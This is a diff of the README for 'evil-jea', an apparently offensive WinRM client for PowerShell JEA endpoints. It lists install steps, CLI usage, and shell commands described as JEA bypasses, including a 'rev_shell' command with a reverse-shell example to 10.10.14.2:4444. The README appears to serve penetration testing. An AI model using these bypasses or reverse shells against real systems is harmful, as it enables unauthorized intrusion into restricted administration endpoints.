@@ -1,45 +1,76 @@
-# evil_jea
+# Evil-JEA
 
 A small WinRM client designed for interacting with JEA endpoints.
 
-## Project Features
+## Installation
 
-* [evil_jea](http://evil-jea.readthedocs.io/)
-* a starter [Click](http://click.pocoo.org/5/) command-line application
-* automated unit tests you can run with [pytest](https://docs.pytest.org/en/latest/)
-* a [Sphinx](http://www.sphinx-doc.org/en/master/) documentation project
+From PyPi:
+```
+pip install evil-jea
+```
 
-## Getting Started
+From source:
+```
+git clone https://github.com/sashathomas/evil-jea
+cd evil-jea
+make install
+make build
+```
 
-The project's documentation contains a section to help you
-[get started](https://evil-jea.readthedocs.io/en/latest/getting_started.html) as a developer or
-user of the library.
+## Usage
+```
+Usage: evil-jea [OPTIONS] COMMAND [ARGS]...
 
-## Development Prerequisites
+  ___________     .__.__                 ____.___________   _____   
+  \_   _____/__  _|__|  |               |    |\_   _____/  /  _  \  
+   |    __)_\  \/ /  |  |    ______     |    | |    __)_  /  /_\  \ 
+   |        \\   /|  |  |__ /_____/ /\__|    | |        \/    |    \
+  /_______  / \_/ |__|____/         \________|/_______  /\____|__  /
+          \/                                          \/         \/ 
+                                                                                                                           
+      
 
-If you're going to be working in the code (rather than just using the library), you'll want a few utilities.
+Options:
+  -v, --verbose  Enable verbose output.
+  --help         Show this message and exit.
 
-* [GNU Make](https://www.gnu.org/software/make/)
-* [Pandoc](https://pandoc.org/)
+Commands:
+  connect  Connect to JEA target.
+  run      Run a single command on the JEA target.
+  shell    Attempts to run a reverse shell on the target using a call...
+  version  Get the library version.
+```
+## JEA Shell
+Once connected to a shell, evil-jea offers a couple custom commands to help find and exploit common JEA misconfigurations:
 
-## Resources
+```
+[10.10.10.210]: PS> help
 
-Below are some handy resource links.
+JEA Shell Commands:
+    help                    Show list of available commands
+    info [command]          Dump definitions for available commands. 
+    call [command]          JEA bypass: Attempts to run [command] using call operator 
+    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
+    rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
+```
 
-* [Project Documentation](http://evil-jea.readthedocs.io/)
-* [Click](http://click.pocoo.org/5/) is a Python package for creating beautiful command line interfaces in a composable way with as little code as necessary.
-* [Sphinx](http://www.sphinx-doc.org/en/master/) is a tool that makes it easy to create intelligent and beautiful documentation, written by Geog Brandl and licnsed under the BSD license.
-* [pytest](https://docs.pytest.org/en/latest/) helps you write better programs.
-* [GNU Make](https://www.gnu.org/software/make/) is a tool which controls the generation of executables and other non-source files of a program from the program's source files.
+## Examples
+Connect to JEA endpoint:
+```
+evil-jea connect username password 10.10.10.10
+```
 
+Run single command on JEA endpoint:
+```
+evil-jea run username password 10.10.10.10 "Get-Command"
+```
 
-## Authors
+Try to run a PowerShell reverse shell using a call operator bypass:
+```
+[10.10.10.210]: PS> rev_shell 10.10.14.2 4444
+```
 
-* **Sasha Thomas** - *Initial work* - [github](https://github.com/sashathomas)
-
-See also the list of [contributors](https://github.com/sashathomas/evil_jea/contributors) who participated in this project.
-
-## LicenseMIT License
+## License
 
 Copyright (c) sashathomas
 
